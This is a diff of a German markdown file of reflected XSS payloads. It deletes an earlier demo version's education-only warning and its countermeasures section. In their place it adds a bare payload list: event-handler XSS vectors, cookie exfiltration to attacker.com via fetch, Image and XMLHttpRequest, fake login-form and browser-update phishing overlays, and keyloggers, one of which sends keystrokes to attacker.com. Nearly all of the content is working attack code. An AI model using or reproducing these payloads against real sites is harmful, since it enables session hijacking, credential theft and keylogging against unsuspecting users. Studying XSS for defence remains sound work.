@@ -1,124 +1,265 @@
-# XSS Payloads für Live-Demo
+# Reflected XSS Payloads
 
-## ⚠️ Hinweis
-Diese Payloads dienen ausschließlich zu Bildungszwecken und dürfen nur in kontrollierten Testumgebungen verwendet werden.
+## Basis Payloads
 
-## Reflected XSS Payloads
+### IMG-Tag mit onerror (EMPFOHLEN!)
 
-### 1. Einfacher Alert-Payload
-```
-<script>alert('XSS')</script>
-```
-**URL:** `http://localhost:8000/?search=<script>alert('XSS')</script>`
-
-**Erklärung:** Zeigt eine einfache Alert-Box mit dem Text "XSS"
-
----
-
-### 2. Cookie-Diebstahl Demonstration
-```
-<script>alert(document.cookie)</script>
-```
-**URL:** `http://localhost:8000/?search=<script>alert(document.cookie)</script>`
-
-**Erklärung:** Zeigt alle Cookies der aktuellen Session an
-
----
-
-### 3. IMG-Tag mit Onerror
-```
+```html
 <img src=x onerror="alert('XSS')">
 ```
-**URL:** `http://localhost:8000/?search=<img src=x onerror="alert('XSS')">`
 
-**Erklärung:** Nutzt das onerror-Event eines Bildes, um JavaScript auszuführen
+```html
+<img src=x onerror="alert(document.cookie)">
+```
+
+```html
+<img src=x onerror=alert(document.cookie)>
+```
 
 ---
 
-### 4. SVG-basierter XSS
-```
-<svg onload=alert('XSS')>
-```
-**URL:** `http://localhost:8000/?search=<svg onload=alert('XSS')>`
+### SVG mit onload
 
-**Erklärung:** Verwendet SVG-Tag mit onload-Event
+```html
+<svg onload="alert('XSS')">
+```
+
+```html
+<svg onload="alert(document.cookie)">
+```
+
+```html
+<svg onload=alert(document.cookie)>
+```
 
 ---
 
-### 5. Body-Tag mit Onload
-```
-<body onload=alert('XSS')>
-```
-**URL:** `http://localhost:8000/?search=<body onload=alert('XSS')>`
+### Input mit autofocus
 
-**Erklärung:** Missbraucht das onload-Event des body-Tags
+```html
+<input autofocus onfocus="alert('XSS')">
+```
+
+```html
+<input autofocus onfocus="alert(document.cookie)">
+```
+
+```html
+<input autofocus onfocus=alert(document.cookie)>
+```
 
 ---
 
-### 6. Input-Tag mit Autofocus
-```
-<input autofocus onfocus=alert('XSS')>
-```
-**URL:** `http://localhost:8000/?search=<input autofocus onfocus=alert('XSS')>`
+### Details-Tag mit ontoggle
 
-**Erklärung:** Nutzt autofocus und onfocus für sofortige Ausführung
+```html
+<details open ontoggle="alert('XSS')">
+```
+
+```html
+<details open ontoggle="alert(document.cookie)">
+```
+
+```html
+<details open ontoggle=alert(document.cookie)>
+```
 
 ---
 
-### 7. Details-Tag
-```
-<details open ontoggle=alert('XSS')>
-```
-**URL:** `http://localhost:8000/?search=<details open ontoggle=alert('XSS')>`
+### IFRAME mit javascript:
 
-**Erklärung:** HTML5 details-Tag mit ontoggle-Event
+```html
+<iframe src="javascript:alert('XSS')">
+```
+
+```html
+<iframe src="javascript:alert(document.cookie)">
+```
 
 ---
 
-### 8. JavaScript-URL
-```
-<a href="javascript:alert('XSS')">Click</a>
-```
-**URL:** `http://localhost:8000/?search=<a href="javascript:alert('XSS')">Click</a>`
+### Body-Tag mit onload
 
-**Erklärung:** JavaScript-Protokoll in einem Link
+```html
+<body onload="alert('XSS')">
+```
+
+```html
+<body onload="alert(document.cookie)">
+```
 
 ---
 
-### 9. DOM-Manipulation
-```
-<script>document.body.innerHTML='<h1>Gehackt!</h1>'</script>
-```
-**URL:** `http://localhost:8000/?search=<script>document.body.innerHTML='<h1>Gehackt!</h1>'</script>`
+### JavaScript-URL in Link
 
-**Erklärung:** Überschreibt den kompletten Body-Inhalt der Seite
+```html
+<a href="javascript:alert('XSS')">Klick</a>
+```
+
+```html
+<a href="javascript:alert(document.cookie)">Klick</a>
+```
 
 ---
 
-### 10. Event-Handler ohne Quotes
-```
-<img src=x onerror=alert(1)>
-```
-**URL:** `http://localhost:8000/?search=<img src=x onerror=alert(1)>`
+### Video/Audio mit onerror
 
-**Erklärung:** Funktioniert auch ohne Anführungszeichen
+```html
+<video src=x onerror="alert('XSS')">
+```
+
+```html
+<audio src=x onerror="alert(document.cookie)">
+```
 
 ---
 
-## Gegenmaßnahmen
+### Marquee mit onstart
 
-### Input-Validierung
-Benutzereingaben sollten serverseitig validiert und gefiltert werden.
+```html
+<marquee onstart="alert('XSS')">Text</marquee>
+```
 
-### Output-Encoding
-Alle Benutzereingaben müssen vor der Ausgabe HTML-encoded werden:
-- `<` wird zu `&lt;`
-- `>` wird zu `&gt;`
-- `"` wird zu `&quot;`
-- `'` wird zu `&#x27;`
+```html
+<marquee onstart="alert(document.cookie)">Text</marquee>
+```
 
-### Content Security Policy (CSP)
-CSP-Header verhindert die Ausführung von Inline-JavaScript.
+---
 
-### HTTPOnly Cookie-Flag
-Cookies mit HTTPOnly-Flag können nicht via JavaScript ausgelesen werden.
+### Object-Tag
+
+```html
+<object data="javascript:alert('XSS')">
+```
+
+```html
+<object data="javascript:alert(document.cookie)">
+```
+
+---
+
+## Cookie-Diebstahl
+
+### Cookies anzeigen
+
+```html
+<img src=x onerror="alert(document.cookie)">
+```
+
+---
+
+### Cookies an Server senden (fetch)
+
+```html
+<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
+```
+
+---
+
+### Cookies an Server senden (Image)
+
+```html
+<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">
+```
+
+---
+
+### Mit URL-Encoding
+
+```html
+<img src=x onerror="fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))">
+```
+
+---
+
+### Via XMLHttpRequest
+
+```html
+<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','https://attacker.com/steal?c='+document.cookie);x.send()">
+```
+
+---
+
+### Cookies + URL + UserAgent
+
+```html
+<img src=x onerror="fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
+```
+
+---
+
+## Phishing
+
+### Fake Login-Form
+
+```html
+<img src=x onerror="document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1)\"><h2 style=\"text-align:center\">Login</h2><form onsubmit=\"alert(document.getElementById(\'e\').value+\' \'+document.getElementById(\'p\').value);return false\"><input id=\"e\" type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><input id=\"p\" type=\"password\" placeholder=\"Passwort\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><button type=\"submit\" style=\"width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer\">Login</button></form></div>'">
+```
+
+---
+
+### Fake Sicherheitswarnung
+
+```html
+<img src=x onerror="document.body.innerHTML='<div style=\"max-width:500px;margin:100px auto;padding:30px;background:#fff3cd;border:2px solid #ffc107;border-radius:8px\"><h2 style=\"color:#856404\">⚠️ Sicherheitswarnung</h2><p style=\"color:#856404\">Verdächtige Aktivitäten wurden festgestellt. Bitte verifizieren Sie Ihre Identität.</p><button onclick=\"alert(\\\'Clicked!\\\')\">Verifizieren</button></div>'">
+```
+
+---
+
+### Fake Update-Hinweis
+
+```html
+<img src=x onerror="alert('⚠️ Wichtiges Sicherheitsupdate verfügbar! Klicken Sie OK um fortzufahren.')">
+```
+
+---
+
+### Fake Browser-Update
+
+```html
+<img src=x onerror="document.body.innerHTML='<div style=\"text-align:center;padding:100px;font-family:Arial\"><h1>Browser Update erforderlich</h1><p>Ihr Browser ist veraltet. Bitte aktualisieren Sie jetzt.</p><button style=\"background:#4CAF50;color:white;padding:15px 30px;border:none;border-radius:4px;font-size:16px;cursor:pointer\">Jetzt aktualisieren</button></div>'">
+```
+
+---
+
+### Fake Captcha
+
+```html
+<img src=x onerror="document.body.innerHTML='<div style=\"text-align:center;padding:100px\"><h2>Sicherheitsprüfung</h2><p>Bitte bestätigen Sie, dass Sie kein Roboter sind</p><button onclick=\"alert(\\\'Verified!\\\')\">Ich bin kein Roboter ✓</button></div>'">
+```
+
+---
+
+### Fake Gewinnspiel
+
+```html
+<img src=x onerror="alert('🎉 Herzlichen Glückwunsch! Sie haben ein iPhone gewonnen! Klicken Sie hier um Ihren Preis zu erhalten.')">
+```
+
+---
+
+## Keylogger
+
+### Einfacher Keylogger (Console)
+
+```html
+<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;console.log('KEYS:'+k)}">
+```
+
+---
+
+### Keylogger mit Alert nach 10 Zeichen
+
+```html
+<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10)alert('Captured:'+k)}">
+```
+
+---
+
+### Keylogger der an Server sendet
+
+```html
+<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('https://attacker.com/keys?d='+k);k=''}}">
+```
+
+---
